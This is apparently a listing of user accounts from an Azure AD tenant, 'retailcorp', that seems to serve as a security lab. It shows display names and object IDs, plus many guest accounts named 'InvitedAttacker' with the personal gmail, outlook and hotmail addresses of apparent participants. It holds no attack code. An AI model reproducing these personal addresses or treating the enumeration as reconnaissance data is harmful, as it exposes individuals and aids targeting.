+Augustina S Trammell   dd43f73e-e55b-4ee7-bc24-045465692489                                                         AugustinaSTrammell@retailcorp.onmicrosoft.com
+Aviel Giat             c51631ae-7232-4e64-8a01-41d27a6cf768 avielg85@gmail.com                                      avielg85_gmail.com#EXT#@retailcorp.onmicrosoft.com
+TestAz                 283d3605-d203-4be2-9072-c579ae24d10d azaltered@outlook.com                                   azaltered_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       98753f13-8da9-4ee9-b4df-21b131ba5e72 aznflab@gmail.com                                       aznflab_gmail.com#EXT#@retailcorp.onmicrosoft.com
+Barbara J Baltes       fdccf06b-5652-4c93-bf84-ac8e74f2ce2f                                                         BarbaraJBaltes@retailcorp.onmicrosoft.com
+Barbara T Salinas      3f19cbd7-4532-4ea6-ae80-b631d677934b                                                         BarbaraTSalinas@retailcorp.onmicrosoft.com
+InvitedAttacker1       230142a4-c1ba-4d2f-9bc0-4d1a6b8cf459 bbhunter12@outlook.com                                  bbhunter12_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       f203c6ff-d3e5-4c83-bf0a-b3895c792ba7 bbhunter12@onmicrosofot.com                             bbhunter12_onmicrosofot.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       02bba110-d791-4cd4-821f-381b348c1211 bbhunter12@onmicrosoft.com                              bbhunter12_onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Beatrice C Parker      07426fc7-1b94-4516-887a-34b44f1209fc                                                         BeatriceCParker@retailcorp.onmicrosoft.com
+Benjamin B Prater      140337a8-bfd1-41e7-b352-641c483eeb0b                                                         BenjaminBPrater@retailcorp.onmicrosoft.com
+Benny                  195cc755-f69f-4785-9c67-7851adabecb1 ZioZielglar-pim@anandpavithranugcusatac.onmicrosoft.com ZioZielglar-pim_anandpavithranugcusatac.onmicrosoft.co#EXT#@retailcorp.onmicrosoft.com
+Berta C Hollins        77e6dd36-133b-49f4-9125-29f8043a919b                                                         BertaCHollins@retailcorp.onmicrosoft.com
+Betsy R Wiggins        a7b7bf85-4506-4052-bcad-afb55f51960b                                                         BetsyRWiggins@retailcorp.onmicrosoft.com
+Betty C Weber          7d7e3607-d6fb-4851-9d26-4a08956945a6                                                         BettyCWeber@retailcorp.onmicrosoft.com
+Betty J Theis          c72a6021-724d-493f-a7ea-013b7e0173d5                                                         BettyJTheis@retailcorp.onmicrosoft.com
+bigkenspim             c03e933c-0bd9-4b1b-b5c8-700601dae263 bigkenspim@outlook.com                                  bigkenspim_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Bill L Pietsch         8e68cef3-6328-49ce-b9a6-bbfff5caa124                                                         BillLPietsch@retailcorp.onmicrosoft.com
+Billy M Sims           9d5b4c68-bf16-4627-8958-c6e2b9c513d5                                                         BillyMSims@retailcorp.onmicrosoft.com
+FNU LNU                59aa5987-405c-4a9b-908a-5838ecd401c7 bim01@bimsec.onmicrosoft.com                            bim01_bimsec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Blue Storm             310064e7-89df-48f5-8477-04a647ca815a bluestorm_pim@bluecorp3.onmicrosoft.com                 bluestorm_pim_bluecorp3.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       ca0c3c06-4456-4f96-bec3-02def30fad3b bob@shaxity.onmicrosoft.com                             bob_shaxity.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Bobbie J Evans         08a5ca2a-7744-4d23-82c8-dfd69410bf04                                                         BobbieJEvans@retailcorp.onmicrosoft.com
+Bob Rose               6a8e72f5-4d81-4b37-b2b6-96c3978ec4bb                                                         bobrose@retailcorp.onmicrosoft.com
+Bonnie L McElroy       0a601dbe-ef13-475f-bdbf-1a41e951c9d2                                                         BonnieLMcElroy@retailcorp.onmicrosoft.com
+Brad V Parks           f749603c-75c8-4d41-9d4a-a5e81f5e2f70                                                         BradVParks@retailcorp.onmicrosoft.com
+Brian F Robinson       c051aa59-b1e3-48f6-8fd5-ff43eb530fda                                                         BrianFRobinson@retailcorp.onmicrosoft.com
+Brian M Nelson         0f15f3f1-b9e1-4b95-b2e0-10be7b243939                                                         BrianMNelson@retailcorp.onmicrosoft.com
+Tyron Kemp             c0cfad41-609c-4914-95e6-ef46690ae8d4 bsidespewpew@gmail.com                                  bsidespewpew_gmail.com#EXT#@retailcorp.onmicrosoft.com
+Carlton P Carpenter    ec080b59-23ab-4af7-b388-cc84c18fceb5                                                         CarltonPCarpenter@retailcorp.onmicrosoft.com
+Carmella R Upton       46484d5a-37b8-4f2e-8bba-684f71007478                                                         CarmellaRUpton@retailcorp.onmicrosoft.com
+Carolina J Reid        2838a7e1-0ba6-4465-b1e2-9fb29566cfba                                                         CarolinaJReid@retailcorp.onmicrosoft.com
+Carolyn J Diaz         112b3d77-6d54-4b8a-92e9-331830b44373                                                         CarolynJDiaz@retailcorp.onmicrosoft.com
+Cassie J Walker        f984f77d-e174-46a3-a051-48c5fa216bfc                                                         CassieJWalker@retailcorp.onmicrosoft.com
+Charles K Carver       be36ef0c-1719-41f7-8e07-7494c1496592                                                         CharlesKCarver@retailcorp.onmicrosoft.com
+Cheryl C Woodard       bbe7470e-9468-4561-8451-83fae1e16cac                                                         CherylCWoodard@retailcorp.onmicrosoft.com
+Chris Green            6721d225-55c6-4237-a1d1-86cf96640bad chris@ayushadhikari.onmicrosoft.com                     chris_ayushadhikari.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+chrisG                 a68d1f59-aba1-4f44-a649-05109bc97dfa chris@wambugz.onmicrosoft.com                           chris_wambugz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Chris H Robbins        54ecde4d-08f5-4419-a3a9-bea5edcbfc0b                                                         ChrisHRobbins@retailcorp.onmicrosoft.com
+Christina G Malloy     8c6d0f20-3e47-46b4-8fa1-c01d78cf893d                                                         ChristinaGMalloy@retailcorp.onmicrosoft.com
+Christine L Sample     413589e8-600d-4a59-b50f-8d0cffe4f883                                                         ChristineLSample@retailcorp.onmicrosoft.com
+Christopher E Robinson 60193b3e-bf49-475c-a274-a82d4feade49                                                         ChristopherERobinson@retailcorp.onmicrosoft.com
+Christy R Shorter      45f2f9e2-0822-4eac-b57b-2a50fa8e1aae                                                         ChristyRShorter@retailcorp.onmicrosoft.com
+Claire S Lessard       c2c10a55-c44c-4e11-87fc-d2c663903f58                                                         ClaireSLessard@retailcorp.onmicrosoft.com
+Claudette L Jensen     8c6e9070-bd76-4b3f-95ad-293e39055693                                                         ClaudetteLJensen@retailcorp.onmicrosoft.com
+Corina T Wooldridge    9f38f800-a503-46ba-aa0f-1a37d892cc81                                                         CorinaTWooldridge@retailcorp.onmicrosoft.com
+Corine E Miller        d65f070c-08a2-4d66-92b2-67e3977d4464                                                         CorineEMiller@retailcorp.onmicrosoft.com
+corvos                 e6c4ad74-0b44-4b85-9a4d-61ea6acbe8f5 corv0s@keemail.me                                       corv0s_keemail.me#EXT#@retailcorp.onmicrosoft.com
+corvos                 912fd5f0-b04c-4faa-a485-391a51773fc8 corvos@corvos.com                                       corvos_corvos.com#EXT#@retailcorp.onmicrosoft.com
+corvos                 7a8f0255-4f6f-4fcf-b7bd-94546f158971 corvos@keemail.me                                       corvos_keemail.me#EXT#@retailcorp.onmicrosoft.com
+Courtney L Tolentino   1447b10a-0934-4a67-a007-5b9d5e9a0da6                                                         CourtneyLTolentino@retailcorp.onmicrosoft.com
+Craig C Slusher        fc9e23b6-a397-4ee0-8e83-616dffed67de                                                         CraigCSlusher@retailcorp.onmicrosoft.com
+InvitedCronos          3a5e4476-20b6-4660-8015-12e28b1cc732 cronos@tnjg4.onmicrosoft.com                            cronos_tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Cesar Soto             d8705a89-147c-4974-be60-302c013d8d83 csilence@azoverload.onmicrosoft.com                     csilence_azoverload.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       852b6bdf-c3ea-4f63-9bc8-dde4aed7b720 CTF_4zur3_m1c@outlook.com                               CTF_4zur3_m1c_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker2       ece15065-b32f-4a47-bcf7-e5fba1a2c3d3 cuentatestprueba01@hotmail.com                          cuentatestprueba01_hotmail.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker2       b207f762-a0d3-475d-9c96-66125a17adfc cuentatestprueba01@hotmial.com                          cuentatestprueba01_hotmial.com#EXT#@retailcorp.onmicrosoft.com
+Dale C Reynolds        f3985ffb-c733-4bc6-9b89-522fa1638023                                                         DaleCReynolds@retailcorp.onmicrosoft.com
+Dan E Gonzalez         6fc12c17-e10d-4491-9b5e-35bdcfa173d1                                                         DanEGonzalez@retailcorp.onmicrosoft.com
+InvitedAttacker1       c0136b01-a4c7-4a2c-8fbb-26894c521350 danfisgman2020@gmail.com                                danfisgman2020_gmail.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       3a4b848c-98ca-4c86-80ab-26e951d2d8d5 danfishman2020@gmail.com                                danfishman2020_gmail.com#EXT#@retailcorp.onmicrosoft.com
+Daniel E Archer        6fd47344-fa10-4a7d-863a-b3178fd42c83                                                         DanielEArcher@retailcorp.onmicrosoft.com
+Dan J Garcia           5e7fbaca-e270-441c-99ae-446d8f47f45e                                                         DanJGarcia@retailcorp.onmicrosoft.com
+Danyelle T Ramirez     011be9f9-8c57-4b11-956e-7b34621afe7b                                                         DanyelleTRamirez@retailcorp.onmicrosoft.com
+InvitedAttacker121444  7512eb67-15be-43e1-9614-7afb5f297fb4 darkraptor2213@outlook.com                              darkraptor2213_outlook.com#EXT#@retailcorp.onmicrosoft.com
+David A Maffei         cc283ce5-92b9-4821-ad18-9d23e365af3e                                                         DavidAMaffei@retailcorp.onmicrosoft.com
+David B Beebe          c4c22260-13ff-435d-a0cd-c7264bd11c8d                                                         DavidBBeebe@retailcorp.onmicrosoft.com
+David B Harry          a211b62c-f2e7-4e64-8951-33d121599665                                                         DavidBHarry@retailcorp.onmicrosoft.com
+David P Harris         fe2dde86-f929-4fa9-816c-37c3664b78d9                                                         DavidPHarris@retailcorp.onmicrosoft.com
+David S Green          ac3f2d86-20a6-4bf7-ad28-5ddb67210a75                                                         DavidSGreen@retailcorp.onmicrosoft.com
+David V Harris         d2b83dac-ad43-4fcc-bddb-e0e35f807e30                                                         DavidVHarris@retailcorp.onmicrosoft.com
+Deborah M Pettaway     75208fb3-bfd6-439c-adbd-efaec71f1b66                                                         DeborahMPettaway@retailcorp.onmicrosoft.com
+Della E West           d37a56d5-687b-4489-a642-94f3d389336d                                                         DellaEWest@retailcorp.onmicrosoft.com
+Dewayne S Sturgis      b648a891-0d03-4495-9238-b74b809b860e                                                         DewayneSSturgis@retailcorp.onmicrosoft.com
+Diana M White          a6b1bdcc-50bd-4f08-8a09-ab3803bad1e1                                                         DianaMWhite@retailcorp.onmicrosoft.com
+Dianne M Ward          30524fb0-3897-4d78-b204-92eb18981c5a                                                         DianneMWard@retailcorp.onmicrosoft.com
+Donald E Snyder        fcf7da79-c8e9-44be-b479-3f59a2994d4e                                                         DonaldESnyder@retailcorp.onmicrosoft.com
+Donald L Pierce        31e87bae-b4a4-4e75-913c-ad79dd6bcf69                                                         DonaldLPierce@retailcorp.onmicrosoft.com
+Donetta C Bair         6f2081b2-c323-459f-af2c-cc29611f424e                                                         DonettaCBair@retailcorp.onmicrosoft.com
+Dorothy M Jewell       fcaf534d-f64b-4bbc-8c9a-25266dc02ee5                                                         DorothyMJewell@retailcorp.onmicrosoft.com
+Doug D Williams        1938cfb8-3ede-4192-b3ab-a69bbddf13a8                                                         DougDWilliams@retailcorp.onmicrosoft.com
+Douglas D Dendy        b1099e1d-e872-48c2-940d-4ebd50508492                                                         DouglasDDendy@retailcorp.onmicrosoft.com
+Douglas G Rogers       3f5608bb-4a81-49da-a7da-4d2495c05b4f                                                         DouglasGRogers@retailcorp.onmicrosoft.com
+InvitedAttacker1       ffb01d68-6fd8-4546-a0ca-cc76d41f76e2 dr3amstat3247@gmail.com                                 dr3amstat3247_gmail.com#EXT#@retailcorp.onmicrosoft.com
+asdf                   265febe1-c702-42d2-a3c6-e9e7a3aae461 dude@gonnahack.onmicrosoft.com                          dude_gonnahack.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Edna S Patterson       657131c4-8a4a-44e9-be66-8c292f2dd8b6                                                         EdnaSPatterson@retailcorp.onmicrosoft.com
+Edward E Davis         61552619-5978-4bd2-a84f-2458e75c5a1b                                                         EdwardEDavis@retailcorp.onmicrosoft.com
+Edward S Chapman       6b2c379d-a09b-4c65-a860-2df034fd38a6                                                         EdwardSChapman@retailcorp.onmicrosoft.com
+Elaine R Baez          017bd760-9686-4204-817f-2bc7dafd86a7                                                         ElaineRBaez@retailcorp.onmicrosoft.com
+Elaine R Esquer        142c8c90-0f05-4b44-bd76-a191d08860df                                                         ElaineREsquer@retailcorp.onmicrosoft.com
+Elena G Brown          aa203d2a-9c10-43bb-a92c-6a924d50f355                                                         ElenaGBrown@retailcorp.onmicrosoft.com
+Elena R Corsi          e6a82365-2fd1-4c04-902d-e6a1d9c79f11                                                         ElenaRCorsi@retailcorp.onmicrosoft.com
+ellan wambugu          0a043906-1993-4316-992a-972808b3c20e Ellanpim@wambugz.onmicrosoft.com                        Ellanpim_wambugz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ellen P Lane           fc33035a-ca4a-414f-8671-a67c0dd54122                                                         EllenPLane@retailcorp.onmicrosoft.com
+Elsie A Ryan           5224c5c4-97dc-441b-aa33-44b30a322002                                                         ElsieARyan@retailcorp.onmicrosoft.com
+Elvira H Boswell       31aa43dd-2ecd-47b0-9f1c-6a5265f81c75                                                         ElviraHBoswell@retailcorp.onmicrosoft.com
+Emil B Moore           82c28267-9ef6-44be-8a61-7a3c07ee8e90                                                         EmilBMoore@retailcorp.onmicrosoft.com
+Rony                   34b6ff04-d5ae-4bf2-87f4-bbc346603ac1 er.rony007@gmail.com                                    er.rony007_gmail.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                d2d6bcc5-2a33-4406-abe1-9626a780001f er.rony007@testrony786.onmicrosoft.com                  er.rony007_testrony786.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       45b6067f-a5c9-4f91-9d0a-5fb72a876ee0 eric.pentest.bdo@outlook.com                            eric.pentest.bdo_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Erin M Grill           a764c6e0-5b1e-409b-9c7f-beb18f8bf61c                                                         ErinMGrill@retailcorp.onmicrosoft.com
+Esther G Walker        51317940-5d83-4b08-9d67-ef269dd71c64                                                         EstherGWalker@retailcorp.onmicrosoft.com
+Esther R Lowder        1a973abe-905f-44ff-a1c5-8c4a54092aec                                                         EstherRLowder@retailcorp.onmicrosoft.com
+InvitedAttacker1       1392dd25-50e7-491d-803e-8c123e47ff46 ethicalhacker302@outlook.com                            ethicalhacker302_outlook.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                460fa664-f33c-4b38-a7f3-f16221f71742 evalle@secopszone.onmicrosoft.com                       evalle_secopszone.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Eva R Gonzalez         d88daaaf-59f3-4b6b-b614-a03ca0764fcd                                                         EvaRGonzalez@retailcorp.onmicrosoft.com
+Faye J Probst          71e2ea73-f765-463e-ab44-0b289ff604f1                                                         FayeJProbst@retailcorp.onmicrosoft.com
+Florence R Miller      3e460979-5ce7-4081-b4c8-7ea16de7bb62                                                         FlorenceRMiller@retailcorp.onmicrosoft.com
+Francine E Darwin      1d5e2019-eeca-403d-b540-8b42e85176c6                                                         FrancineEDarwin@retailcorp.onmicrosoft.com
+Francis H Flynn        bcb7b1a1-7bf8-4a51-b053-13e8fde57010                                                         FrancisHFlynn@retailcorp.onmicrosoft.com
+Fran T Sims            0570ea77-cac1-408c-99e6-595730424fbb                                                         FranTSims@retailcorp.onmicrosoft.com
+Fred K Briley          c3b4756c-c027-4338-b1f6-f4444da39af8                                                         FredKBriley@retailcorp.onmicrosoft.com
+Fred S Wallick         4b8bacf9-b6b8-42a0-b765-57a1a5a1b225                                                         FredSWallick@retailcorp.onmicrosoft.com
+Gary C Knight          73e47908-75ae-4246-bb87-f1837c72e8c1                                                         GaryCKnight@retailcorp.onmicrosoft.com
+Gary S Cleaver         8126f90b-3f02-4c2b-8123-7fff8eab66bf                                                         GarySCleaver@retailcorp.onmicrosoft.com
+Gene V Tucker          5a08f129-d8f2-407d-ac0e-981953f4f65c                                                         GeneVTucker@retailcorp.onmicrosoft.com
+George A Erickson      2deb3d68-f327-4bd4-b93c-e77322853162                                                         GeorgeAErickson@retailcorp.onmicrosoft.com
+Georgette H Williams   62027c99-b026-43b8-9e06-3c3610961c2e                                                         GeorgetteHWilliams@retailcorp.onmicrosoft.com
+Geraldine D Griffis    c9417827-4412-48a1-bf72-a0598bda713c                                                         GeraldineDGriffis@retailcorp.onmicrosoft.com
+guogen ang             5dd13566-abde-4aa7-8d45-bf2918e7ffce ggang@isrighthere.onmicrosoft.com                       ggang_isrighthere.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ginger V Navarro       094c6eaa-1229-4689-94f1-c8f9ef5bb7de                                                         GingerVNavarro@retailcorp.onmicrosoft.com
+gopika                 d538d151-5d3d-45c0-8d83-b7c1e8f8ecdc gopika@aswathymohan97outlook.onmicrosoft.com            gopika_aswathymohan97outlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       ca549561-351c-42a9-90f4-c6e71f6a120b gopika@aswathymohan72outlook.onmicrosoft.com            gopika_aswathymohan72outlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       b38ab3ee-7775-435f-a40b-bf9e2ac0bee7 graham@gobrien644210outlook.onmicrosoft.com             graham_gobrien644210outlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker007     c5afb561-d64a-4d37-a08b-3def3d924a2d greyhatguy007_operations@outlook.com                    greyhatguy007_operations_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Gues User              aabfd76a-d4e3-4c9e-ba20-73b04c039884 guestuser@adamnurudinihotmail.onmicrosoft.com           guestuser_adamnurudinihotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Gwendolyn M Price      7187dc04-e750-4b6a-bee2-1237f4b124ee                                                         GwendolynMPrice@retailcorp.onmicrosoft.com
+hacker                 10bc3ccd-b0df-47c1-bbcb-2c02418dee27 hacker@insecurecorp.onmicrosoft.com                     hacker_insecurecorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+hackilapim             b87e9c9b-4c6e-45b4-8e1c-d54d69f233cb hackila-pim@hackila.onmicrosoft.com                     hackila-pim_hackila.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Harold B Didomenico    186a257c-7bbe-428f-ac77-6872a1a5afba                                                         HaroldBDidomenico@retailcorp.onmicrosoft.com
+Hazel J Gardner        de8dc429-5cdc-4566-9298-52a3ed8ea46f                                                         HazelJGardner@retailcorp.onmicrosoft.com
+Hector V Stern         65206f71-da95-4998-8616-b7176a67a02e                                                         HectorVStern@retailcorp.onmicrosoft.com
+Helena T Anderson      be5728c9-7de6-4d06-9bf4-da26d1c3d77a                                                         HelenaTAnderson@retailcorp.onmicrosoft.com
+Herman F Clark         357a412e-4334-40bf-b690-1b8698667a02                                                         HermanFClark@retailcorp.onmicrosoft.com
+InvitedAttacker1       177e9030-af5f-4785-bbe6-93a1795a9696 heyeco1370@erynka.com                                   heyeco1370_erynka.com#EXT#@retailcorp.onmicrosoft.com
+Homer C Nelson         a9acd61e-5ce5-42e7-8376-ca7bdc26bfa8                                                         HomerCNelson@retailcorp.onmicrosoft.com
+Howard D White         34ccbaf3-1798-461d-9927-b994940906a3                                                         HowardDWhite@retailcorp.onmicrosoft.com
+Hubert M Vasquez       eb07c61b-ca4e-4420-8318-08b1cecabd1e                                                         HubertMVasquez@retailcorp.onmicrosoft.com
+Ignacio K Glennon      72560a7e-6fd2-4a54-8822-e3b004889828                                                         IgnacioKGlennon@retailcorp.onmicrosoft.com
+ITAdmin-ProdEnv        2dee0b7b-3ddd-4340-b87e-7b717937318f                                                         ITAdmin-ProdEnv@retailcorp.onmicrosoft.com
+ITAdmin-TestEnv        dbb1c403-a95b-4812-af36-26f83f9b03c1                                                         ITAdmin-TestEnv@retailcorp.onmicrosoft.com
+Jackie T Lane          5b3c4208-57e7-415e-841a-63d7337ec002                                                         JackieTLane@retailcorp.onmicrosoft.com
+Jaclyn H Connor        6542a345-3691-4e3b-bfe4-b5ec620575f1                                                         JaclynHConnor@retailcorp.onmicrosoft.com
+Jacob N Lombard        5873fc1c-2eac-4694-b584-6fa77fe68a40                                                         JacobNLombard@retailcorp.onmicrosoft.com
+Jacquelyn J Pullman    51fc6dda-a72b-44d8-a030-3bf998f9248d                                                         JacquelynJPullman@retailcorp.onmicrosoft.com
+Jaime J Bohner         67ef8715-1fda-4b46-86bd-97fa9c22e83a                                                         JaimeJBohner@retailcorp.onmicrosoft.com
+Jaime R Kaczmarek      c838ecaf-8a46-41bb-a756-55f47323c754                                                         JaimeRKaczmarek@retailcorp.onmicrosoft.com
+InvitedAttacker1       edc72a56-d823-415d-8493-cf5542989bb6 jain@shipha.onmicrosoft.com                             jain_shipha.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+James A Green          9918183f-772d-4820-9f44-3b75a0592fbe                                                         JamesAGreen@retailcorp.onmicrosoft.com
+James B Wright         37c168d1-4d22-4c89-abbb-257d4d423b77                                                         JamesBWright@retailcorp.onmicrosoft.com
+James V Olson          8108d958-b1c0-4a16-9680-24a31517ea03                                                         JamesVOlson@retailcorp.onmicrosoft.com
+Jane F Jones           4252c4b2-3c58-450c-8f00-5633f90f87a5                                                         JaneFJones@retailcorp.onmicrosoft.com
+Janet D Daniels        a54aee83-7288-4eda-b407-1779e80e78b5                                                         JanetDDaniels@retailcorp.onmicrosoft.com
+Janice L Jones         b18d5ee8-7a56-4ef2-84e5-48878461bf06                                                         JaniceLJones@retailcorp.onmicrosoft.com
+Janis D Bono           e409fcdc-eb50-4a7c-a9e6-4d939bf9b527                                                         JanisDBono@retailcorp.onmicrosoft.com
+Jared E Anderson       14ec5456-86fb-49b3-a907-8d049bdf9e31                                                         JaredEAnderson@retailcorp.onmicrosoft.com
+Jasmine D Redmon       5e5f14c3-ab7b-4a83-9610-56dc29f94aad                                                         JasmineDRedmon@retailcorp.onmicrosoft.com
+Jason D Slater         641df19f-1088-4ca9-b34a-a638f836f6e1                                                         JasonDSlater@retailcorp.onmicrosoft.com
+Jay G Brady            52151a0c-e56d-4d81-8f7e-d5e59a7962d0                                                         JayGBrady@retailcorp.onmicrosoft.com
+Jean A West            587d9348-ead8-4e0e-9181-852c253e9fee                                                         JeanAWest@retailcorp.onmicrosoft.com
+Jeannette J McArthur   788c4e8b-ebf8-4eb5-a4e5-68b89fce64bf                                                         JeannetteJMcArthur@retailcorp.onmicrosoft.com
+Jennifer J Johnson     f0641baa-8135-4efd-ad34-5f50f32ec588                                                         JenniferJJohnson@retailcorp.onmicrosoft.com
+Jermaine A McGreevy    4ee33fb3-4e84-45ab-8f51-0140c411f692                                                         JermaineAMcGreevy@retailcorp.onmicrosoft.com
+Jerry M Mohr           d57b38fd-6015-4ab6-b6e9-b32ddd281aa0                                                         JerryMMohr@retailcorp.onmicrosoft.com
+Jesse J Deas           bcc5d17d-92a0-44fb-9c76-c2d75182b9a6                                                         JesseJDeas@retailcorp.onmicrosoft.com
+Jesse J Obrien         b71cd856-279c-4759-93ee-1edffa13a42d                                                         JesseJObrien@retailcorp.onmicrosoft.com
+Jessica J Ferguson     a11a497a-dc9e-4fa8-8cc4-ff83683eedc5                                                         JessicaJFerguson@retailcorp.onmicrosoft.com
+InvitedAttacker1       31940900-74f6-49b5-81f5-bb6fa801ec58 jithu.george1@outlook.com                               jithu.george1_outlook.com#EXT#@retailcorp.onmicrosoft.com
+jk bikedays            cf1e3889-1d07-4ddd-9f45-542b889093fb jkbikedays@jkbikedays.onmicrosoft.com                   jkbikedays_jkbikedays.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+JORGE MANUEL GONZALEZ… aaa165d5-8ef8-4003-a286-33b508069d52 jmgonzalezm@kynpentestazure.onmicrosoft.com             jmgonzalezm_kynpentestazure.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Joan K Adams           06204d65-5a20-4560-8d79-ddd6d30311a8                                                         JoanKAdams@retailcorp.onmicrosoft.com
+Jodi R Payton          b66e33a9-f0eb-4def-9fdf-863103b7289e                                                         JodiRPayton@retailcorp.onmicrosoft.com
+Joel A Watson          d32eff88-5de8-4a7a-88fd-794319ee4c17                                                         JoelAWatson@retailcorp.onmicrosoft.com
+John C Waddell         af4576ae-027d-4505-a0d2-3671b1ac0f5c                                                         JohnCWaddell@retailcorp.onmicrosoft.com
+John E Wynn            1194f3d8-f877-46ad-854e-d4a413a3ab43                                                         JohnEWynn@retailcorp.onmicrosoft.com
+John G Garcia          379dbdff-f884-4375-ac39-6cf4349ba4bf                                                         JohnGGarcia@retailcorp.onmicrosoft.com
+John M Humble          fbf40020-380e-44f7-9556-1ac5f047f20e                                                         JohnMHumble@retailcorp.onmicrosoft.com
+John M Jarvis          c6571d29-d71c-4645-bbde-a6539ffea63e                                                         JohnMJarvis@retailcorp.onmicrosoft.com
+John M Smith           434beff1-1bf0-453f-9720-2f35c9874c5a                                                         JohnMSmith@retailcorp.onmicrosoft.com
+John P Millikin        6b37d425-d6ca-4993-b785-5478faae3224                                                         JohnPMillikin@retailcorp.onmicrosoft.com
+Jonathan N McKnight    ac388c19-9823-4e37-be22-449032e45b6d                                                         JonathanNMcKnight@retailcorp.onmicrosoft.com
+Jo R Kelley            9f343d10-6e13-401d-b90a-f011f02d5f35                                                         JoRKelley@retailcorp.onmicrosoft.com
+Jose C Davis           8f3c0281-d8a8-4a4a-b77e-c10d4195faa7                                                         JoseCDavis@retailcorp.onmicrosoft.com
+Josephine W Gales      23540966-7637-468c-8364-63cf72b4367d                                                         JosephineWGales@retailcorp.onmicrosoft.com
+Joseph K Jones         3f424fa5-1084-444b-a818-96203872a57c                                                         JosephKJones@retailcorp.onmicrosoft.com
+Joseph T Lunt          e997e0f5-890f-4642-b490-414c8d0485c8                                                         JosephTLunt@retailcorp.onmicrosoft.com
+naxxramas              6b35832f-9009-4de3-993e-23526e578e4f jrufom.az.lab@outlook.com                               jrufom.az.lab_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Juana A McLeod         18beb889-22b8-43d7-84a6-6959f3518226                                                         JuanaAMcLeod@retailcorp.onmicrosoft.com
+Juan K Jordan          8700fd8c-ff49-49b7-b5c6-a46a5bd45712                                                         JuanKJordan@retailcorp.onmicrosoft.com
+Judie H Lee            3ed96117-04a5-4809-b00e-24f9e78b55ba                                                         JudieHLee@retailcorp.onmicrosoft.com
+Judith J Thompson      ba3cc6b1-3a2a-4e33-bfa8-662671cd6750                                                         JudithJThompson@retailcorp.onmicrosoft.com
+Judy J McKay           e3994db5-69a9-4773-8c60-d4a805a25fc8                                                         JudyJMcKay@retailcorp.onmicrosoft.com
+Julia R Sessions       b22fbeab-4b8d-46ea-a7c4-adddd89349e7                                                         JuliaRSessions@retailcorp.onmicrosoft.com
+Justin A Teal          022832f9-c229-4efc-81ba-99a92fdbc099                                                         JustinATeal@retailcorp.onmicrosoft.com
+InvitedAttacker        872e4be9-13b4-4d67-87c0-b52edc897125 kakarot@tjng4.onmicrosoft.com                           kakarot_tjng4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Karen J Myers          94c988a3-7cac-4413-8a1a-e96ef6e5342a                                                         KarenJMyers@retailcorp.onmicrosoft.com
+Karl A Talley          4db7a6bb-3803-4db8-9d9b-45fbd456b749                                                         KarlATalley@retailcorp.onmicrosoft.com
+Kathleen W Knott       69cca022-4940-412c-b696-698ebf1937b6                                                         KathleenWKnott@retailcorp.onmicrosoft.com
+Kathy V Thomas         54469173-bbbb-4674-9497-4994fb6ed69f                                                         KathyVThomas@retailcorp.onmicrosoft.com
+Katy W Hindman         ab13c5d1-231a-4682-bb37-e20829f263c3                                                         KatyWHindman@retailcorp.onmicrosoft.com
+Keith B Green          dc9821a9-1433-4744-81d0-3e3d5cc10e5c                                                         KeithBGreen@retailcorp.onmicrosoft.com
+Keith E Fisher         99be0e28-af9e-4f72-b034-948d32d14789                                                         KeithEFisher@retailcorp.onmicrosoft.com
+Kelly E Gallardo       7ce65c33-a6f8-4343-b6ca-debeec87a8d4                                                         KellyEGallardo@retailcorp.onmicrosoft.com
+Kenneth A Fuhrman      5f8b4a6a-1cd7-4466-a6cf-a45141e91ca9                                                         KennethAFuhrman@retailcorp.onmicrosoft.com
+Kevin R Oldham         dde559f9-62c7-4e51-ac1a-dfff283038a4                                                         KevinROldham@retailcorp.onmicrosoft.com
+Kim S Clay             4caf7d38-0aa5-4fe7-9447-44dacc59167d                                                         KimSClay@retailcorp.onmicrosoft.com
+Kristina A Byers       9cf6504b-6b2a-4b5c-b777-45ee56d9fdbc                                                         KristinaAByers@retailcorp.onmicrosoft.com
+Kristin C Freeman      a67ad90e-19d3-4514-9cef-c3def51076c2                                                         KristinCFreeman@retailcorp.onmicrosoft.com
+Kristy J Mercado       7d823a8c-020a-47a5-8939-7bddc0a90068                                                         KristyJMercado@retailcorp.onmicrosoft.com
